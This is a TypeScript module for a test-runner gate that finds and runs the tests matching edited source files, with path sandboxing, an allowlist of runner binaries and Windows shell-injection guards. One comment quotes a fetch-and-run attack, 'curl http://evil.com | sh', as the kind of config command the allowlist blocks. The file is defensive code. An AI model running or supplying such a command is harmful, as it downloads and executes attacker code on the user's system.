import { execFile } from 'node:child_process';
import { randomBytes } from 'node:crypto';
import { access, readFile, unlink } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { basename, dirname, isAbsolute, join, relative } from 'node:path';
import { buildWin32CmdShimInvocation, resolveWin32Command } from '@wrongstack/tools/win32';
import { withinProject } from '../runtime/index.js';

/**
 * Resolve a (command, args) pair for execFile so Windows .cmd shims launch
 * correctly. npx/npm/pnpm/vitest/etc. ship as .cmd wrappers on Windows, which
 * execFile cannot launch without a shell (it ignores PATHEXT) — so a bare
 * execFile('npx', …) fails ENOENT and the whole gate silently no-ops there.
 *
 * On non-Windows (or when the resolved binary is a real .exe) this is a
 * passthrough. For a .cmd/.bat shim it routes through cmd.exe with per-argument
 * quoting and a metacharacter guard (buildWin32CmdShimInvocation), so a dynamic
 * test-file path cannot inject a second command — an unsafe argument makes the
 * builder throw, which the callers turn into a skip rather than an injection.
 */
export function resolveExec(
  command: string,
  args: readonly string[],
): { cmd: string; args: string[]; windowsVerbatimArguments: boolean } {
  const resolved = resolveWin32Command(command);
  const needsShell =
    process.platform === 'win32' && (resolved.endsWith('.cmd') || resolved.endsWith('.bat'));
  if (needsShell) {
    const shim = buildWin32CmdShimInvocation(resolved, args);
    return { cmd: shim.command, args: shim.args, windowsVerbatimArguments: true };
  }
  return { cmd: resolved, args: [...args], windowsVerbatimArguments: false };
}

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------

export type Runner = 'vitest' | 'jest' | 'mocha' | 'auto';

export function getResolvableExtensions(patterns: string[]): Set<string> {
  const exts = new Set<string>();
  for (const p of patterns) {
    // Take the last `.xxx` of the pattern template. Patterns are
    // project-controlled so this is a safe heuristic.
    const m = /\.([a-z0-9]+)$/i.exec(p);
    if (m?.[1]) exts.add(`.${m[1].toLowerCase()}`);
  }
  return exts;
}

/**
 * Tiny non-cryptographic content fingerprint (DJB2) for the
 * per-path cache. Capped at 64 KB to keep the cost bounded on
 * very large source files — the first 64 KB is plenty to detect
 * "same source, retouched".
 */
export function pathContentHash(content: string): number {
  const cap = Math.min(content.length, 65536);
  let h = 5381;
  for (let i = 0; i < cap; i++) {
    h = ((h << 5) + h + content.charCodeAt(i)) | 0;
  }
  return h >>> 0;
}

// ---------------------------------------------------------------------------
// Sandbox: reject paths outside the project root, and lock down the
// `command` config option (config-supplied first token = arbitrary
// binary) to an allowlist of legitimate test runners. test-runner-gate
// runs on every write/edit; an attacker who can write to the plugin
// config can already pivot to test-runner-gate to run any process.
// ---------------------------------------------------------------------------
// withinProject() imported from ../runtime/index.js

// Allowlist for custom test commands. The first token of `command` must
// resolve to one of these binaries. Without this, a config-supplied
// `command: "curl http://evil.com | sh"` (which split() doesn't help
// against because of pipes handled outside spawn) becomes a directed
// process start. We limit to the same runner families that ship with
// the plugin and the bundled npx + pnpm test wrappers.
export const ALLOWED_COMMAND_TOKENS = new Set<string>([
  'npx',
  'pnpm',
  'pnpm',
  'npm',
  'yarn',
  'vitest',
  'jest',
  'mocha',
  // Useful for `command: "node ./scripts/run-tests.js"` style configs.
  'node',
  // Direct binary paths under the project's node_modules — resolved
  // by basename in resolveAllowedCommand().
]);

// ---------------------------------------------------------------------------
// Test file resolution
// ---------------------------------------------------------------------------

/**
 * Given a source file path, derive candidate test file paths using the
 * configured patterns. `{name}` = basename without extension,
 * `{path}` = relative path without extension, `{dir}` = dirname.
 *
 * Example: source = "packages/plugins/src/cost-tracker/index.ts"
 *   {name} = "index", {path} = "packages/plugins/src/cost-tracker/index",
 *   {dir} = "packages/plugins/src/cost-tracker"
 *
 * Patterns:
 *   "tests/{name}.test.ts"           → "tests/index.test.ts"
 *   "src/{path}.test.ts"             → "packages/plugins/src/cost-tracker/index.test.ts"
 *   "{dir}/tests/{name}.test.ts"     → ".../cost-tracker/tests/index.test.ts"
 */
export function resolveTestFiles(sourcePath: string, patterns: string[]): string[] {
  const name = basename(sourcePath).replace(/\.[^.]+$/, '');
  const pathNoExt = sourcePath.replace(/\.[^.]+$/, '');
  const dir = dirname(sourcePath);
  // `src/type-gate/index.ts` is usually tested as `tests/type-gate.test.ts`.
  const names = name === 'index' && basename(dir) ? [name, basename(dir)] : [name];
  // Root-relative patterns ("tests/{name}.test.ts") are tried in the source's
  // directory and every ancestor up to the project root, nearest first, so a
  // monorepo package's own tests/ wins over a same-named file elsewhere.
  // Before, only the source directory and the project root were tried, and
  // packages/x/src/foo.ts never found packages/x/tests/foo.test.ts.
  const ancestors: string[] = [];
  const projectRoot = process.cwd();
  for (let current = dir, depth = 0; depth < 8; depth++) {
    const rel = relative(projectRoot, current);
    if (rel === '' || current === '.' || current === '') break;
    ancestors.push(current);
    const parent = dirname(current);
    if (parent === current) break;
    current = parent;
  }

  const candidates: string[] = [];
  const add = (value: string) => {
    if (!candidates.includes(value)) candidates.push(value);
  };
  for (const testName of names) {
    for (const pattern of patterns) {
      const candidate = pattern
        .replace(/\{name\}/g, () => testName)
        .replace(/\{path\}/g, () => pathNoExt)
        .replace(/\{dir\}/g, () => dir);
      if (candidate.startsWith('/') || candidate.includes('{')) continue;
      if (pattern.includes('{dir}') || pattern.includes('{path}')) {
        // Already anchored to the source file.
        add(candidate);
      } else {
        for (const ancestor of ancestors) add(join(ancestor, candidate));
        add(candidate);
      }
    }
  }
  return candidates;
}

/**
 * Find the first test file that exists on disk.
 */
export async function findTestFile(sourcePath: string, patterns: string[]): Promise<string | null> {
  const candidates = resolveTestFiles(sourcePath, patterns);
  for (const candidate of candidates) {
    try {
      await access(candidate);
      return candidate;
    } catch {
      // not found — try next candidate
    }
  }
  return null;
}

// ---------------------------------------------------------------------------
// Runner detection
// ---------------------------------------------------------------------------

export interface RunnerConfig {
  /** The resolved runner name. */
  name: 'vitest' | 'jest' | 'mocha';
  /** Full command prefix (without test file). */
  command: string;
  /** JSON output flag(s) appended after the test file. */
  jsonFlags: string;
}

/**
 * Detect which test runner is available. "auto" tries vitest, then
 * jest, then mocha. Returns the resolved runner + command prefix.
 * Uses `npx <runner> --version` to check availability.
 */
export async function detectRunner(requested: Runner): Promise<RunnerConfig | null> {
  // `npx --no --`: execFile's stdin is not a TTY, so npm exec assumed --yes and
  // the availability probe itself downloaded and ran a missing runner from the
  // registry. Only an installed runner may answer.
  const candidates: RunnerConfig[] = [
    { name: 'vitest', command: 'npx --no -- vitest run', jsonFlags: '--reporter=json' },
    { name: 'jest', command: 'npx --no -- jest', jsonFlags: '--json' },
    { name: 'mocha', command: 'npx --no -- mocha', jsonFlags: '--reporter json' },
  ];

  // If a specific runner is requested, try only that one.
  if (requested !== 'auto') {
    const match = candidates.find((c) => c.name === requested);
    if (!match) return null;
    try {
      await new Promise<void>((resolve, reject) => {
        const ex = resolveExec('npx', ['--no', '--', match.name, '--version']);
        execFile(
          ex.cmd,
          ex.args,
          {
            encoding: 'utf-8',
            timeout: 5_000,
            cwd: process.cwd(),
            windowsHide: true,
            ...(ex.windowsVerbatimArguments ? { windowsVerbatimArguments: true } : {}),
          },
          (err) => (err ? reject(err) : resolve()),
        );
      });
      return match;
    } catch {
      return null;
    }
  }

  // Auto: try each in order.
  for (const candidate of candidates) {
    try {
      await new Promise<void>((resolve, reject) => {
        const ex = resolveExec('npx', ['--no', '--', candidate.name, '--version']);
        execFile(
          ex.cmd,
          ex.args,
          {
            encoding: 'utf-8',
            timeout: 5_000,
            cwd: process.cwd(),
            windowsHide: true,
            ...(ex.windowsVerbatimArguments ? { windowsVerbatimArguments: true } : {}),
          },
          (err) => (err ? reject(err) : resolve()),
        );
      });
      return candidate;
    } catch {
      // not available
    }
  }
  return null;
}

// ---------------------------------------------------------------------------
// Test runner
// ---------------------------------------------------------------------------

export interface TestRunResult {
  passed: boolean;
  testCount: number;
  failCount: number;
  duration: string;
  /** First few failure messages (for context injection). */
  failures: string[];
}

/**
 * Resolve the first token of `customCommand` against an allowlist of
 * legitimate test runners. Returns `[binary, restArgs]` if allowed,
 * `null` otherwise. This prevents a config-supplied `command` from
 * pivoting the runner hook into arbitrary code execution.
 */
export function resolveAllowedCommand(
  customCommand: string,
): { cmd: string; args: string[] } | null {
  const tokens = customCommand.split(/\s+/).filter(Boolean);
  if (tokens.length === 0) return null;
  const head = tokens[0]!;
  // Bare binary name on the allowlist → pass through (PATH resolution).
  if (ALLOWED_COMMAND_TOKENS.has(head)) {
    return { cmd: head, args: tokens.slice(1) };
  }
  // Absolute path under the project → must resolve inside and the
  // basename must be in the allowlist.
  if (isAbsolute(head)) {
    if (!withinProject(head)) return null;
    const base = basename(head);
    if (ALLOWED_COMMAND_TOKENS.has(base)) {
      return { cmd: head, args: tokens.slice(1) };
    }
  }
  return null;
}

/**
 * Run the test command on a specific test file and parse the output.
 * Returns null if the runner itself failed (timeout, crash, not found,
 * or the custom command failed the allowlist).
 */
export async function runTests(
  testFile: string,
  runner: RunnerConfig,
  customCommand: string,
  timeoutMs: number,
): Promise<TestRunResult | null> {
  // Sandbox: refuse to run tests for paths outside the project root.
  if (!withinProject(testFile)) return null;

  // Use custom command if provided, otherwise use the runner's default.
  // execFile argv-form — no shell interpolation. testFile goes in as
  // its own argv element so quotes/spaces in names cannot escape.
  let cmd: string;
  let cmdArgs: string[];
  let trailingFlag: string;
  if (customCommand) {
    const resolved = resolveAllowedCommand(customCommand);
    if (!resolved) return null;
    cmd = resolved.cmd;
    cmdArgs = [...resolved.args, testFile];
    trailingFlag = runner.jsonFlags;
  } else {
    // runner.command is hard-coded by the plugin (no user input) and
    // looks like "npx vitest run" — split into argv tokens.
    const tokens = runner.command.split(/\s+/).filter(Boolean);
    cmd = tokens[0]!;
    cmdArgs = [...tokens.slice(1), testFile];
    trailingFlag = runner.jsonFlags;
  }
  // trailingFlag is a single space-delimited string from the runner
  // table (e.g. "--reporter=json"). execFile wants its own argv
  // element — split spaces too.
  const trailing = trailingFlag.split(/\s+/).filter(Boolean);
  // Vitest 5's json reporter no longer prints to stdout: without an output
  // file it writes `.vitest/json/output.json` and logs one line, so stdout
  // never parsed and every run fell to the text fallback as a PASS. Ask for
  // the report in a file we own (`--outputFile.json`, long supported) and
  // read it back.
  const reportFile =
    runner.name === 'vitest'
      ? join(tmpdir(), `wrongstack-test-gate-${randomBytes(6).toString('hex')}.json`)
      : undefined;
  if (reportFile) trailing.push(`--outputFile.json=${reportFile}`);
  const fullArgs = [...cmdArgs, ...trailing];
  let stdout = '';
  // A runner exits non-zero for a failing run; text output alone cannot tell.
  let exitedNonZero = false;
  try {
    const { stdout: out } = await new Promise<{ stdout: string; stderr: string }>(
      (resolve, reject) => {
        // resolveExec throws for a .cmd shim whose args carry a shell
        // metacharacter (e.g. a hostile test-file name); that throw rejects
        // the promise here and the catch below turns it into a skip, so the
        // dynamic testFile can never inject a command through the Windows shim.
        const ex = resolveExec(cmd, fullArgs);
        execFile(
          ex.cmd,
          ex.args,
          {
            encoding: 'utf-8',
            timeout: timeoutMs,
            cwd: process.cwd(),
            windowsHide: true,
            ...(ex.windowsVerbatimArguments ? { windowsVerbatimArguments: true } : {}),
          },
          (err, out, stderr) => {
            if (err) reject(Object.assign(err, { stdout: out, stderr }));
            else resolve({ stdout: out, stderr });
          },
        );
      },
    );
    stdout = out;
  } catch (err: unknown) {
    const e = err as { stdout?: string; killed?: boolean };
    if (e.killed) {
      if (reportFile) await unlink(reportFile).catch(() => undefined);
      return null; // timeout
    }
    exitedNonZero = true;
    // vitest exits non-zero when tests fail — the report still holds the JSON.
    if (e.stdout) stdout = e.stdout;
    else if (!reportFile) return null;
  }
  if (reportFile) {
    const report = await readFile(reportFile, 'utf-8').catch(() => undefined);
    await unlink(reportFile).catch(() => undefined);
    if (report !== undefined) stdout = report;
    else if (!stdout) return null;
  }

  try {
    const data = JSON.parse(stdout);
    // Mocha's JSON reporter has its own shape — `{stats:{tests,passes,failures},
    // failures:[{fullTitle, err:{message}}]}`. Read through the Jest/Vitest
    // fields below, every count was 0 and a failing mocha suite PASSED.
    if (
      data &&
      typeof data.stats === 'object' &&
      data.stats !== null &&
      !('numTotalTests' in data)
    ) {
      const tests = Number(data.stats.tests) || 0;
      const failed = Number(data.stats.failures) || 0;
      const passedCount = Number(data.stats.passes) || 0;
      const failures = (Array.isArray(data.failures) ? data.failures : [])
        .slice(0, 5)
        .map((f: { fullTitle?: string; title?: string; err?: { message?: string } }) => {
          const message = String(f.err?.message ?? '')
            .split('\n')[0]
            ?.slice(0, 200);
          return `${f.fullTitle ?? f.title ?? 'unknown'}: ${message}`;
        });
      return {
        passed: failed === 0,
        testCount: tests,
        failCount: failed,
        duration: ` ${passedCount} passed, ${failed} failed`,
        failures,
      };
    }
    const numTotalTests = data.numTotalTests ?? 0;
    const numFailedTests = data.numFailedTests ?? 0;
    const numPassedTests = data.numPassedTests ?? 0;
    const success = data.success ?? numFailedTests === 0;

    // Extract failure messages (up to 5).
    const failures: string[] = [];
    if (data.testResults) {
      for (const fileResult of data.testResults) {
        // A file that fails to load (bad import, syntax error) has no failed
        // assertion; its reason is only in the file-level `message`.
        const fileFailedOnly =
          fileResult.status === 'failed' &&
          !(fileResult.assertionResults ?? []).some(
            (a: { status?: string }) => a.status === 'failed',
          );
        if (fileFailedOnly && typeof fileResult.message === 'string') {
          const reason = fileResult.message
            .replace(/\x1b\[[0-9;]*m/g, '')
            .split('\n')
            .map((l: string) => l.trim())
            .find((l: string) => l !== '' && !/^●\s*Test suite failed to run$/.test(l));
          if (reason) {
            failures.push(`${fileResult.name ?? 'test file'}: ${reason.slice(0, 200)}`);
            if (failures.length >= 5) break;
          }
        }
        for (const assertion of fileResult.assertionResults ?? []) {
          if (assertion.status === 'failed') {
            const fullName = assertion.fullName ?? assertion.title ?? 'unknown';
            const message = (assertion.failureMessages?.[0] ?? '').split('\n')[0]?.slice(0, 200);
            failures.push(`${fullName}: ${message}`);
            if (failures.length >= 5) break;
          }
        }
        if (failures.length >= 5) break;
      }
    }

    const passed = Boolean(success) && numFailedTests === 0;
    const effectiveFailCount =
      numFailedTests > 0 ? numFailedTests : !passed ? Math.max(1, failures.length) : 0;

    return {
      passed,
      testCount: numTotalTests,
      failCount: effectiveFailCount,
      duration: `${data.startTime ? '—' : ''} ${numPassedTests} passed, ${effectiveFailCount} failed`,
      failures,
    };
  } catch {
    // JSON parse failed — try to extract a summary from plain text.
    const passedMatch = stdout.match(/(\d+)\s+passed/);
    const failedMatch = stdout.match(/(\d+)\s+failed/);
    const passed = passedMatch ? Number.parseInt(passedMatch[1]!, 10) : 0;
    const failed = failedMatch ? Number.parseInt(failedMatch[1]!, 10) : 0;
    return {
      passed: failed === 0 && !exitedNonZero,
      testCount: passed + failed,
      failCount: failed,
      duration: `${passed} passed, ${failed} failed`,
      failures: [],
    };
  }
}
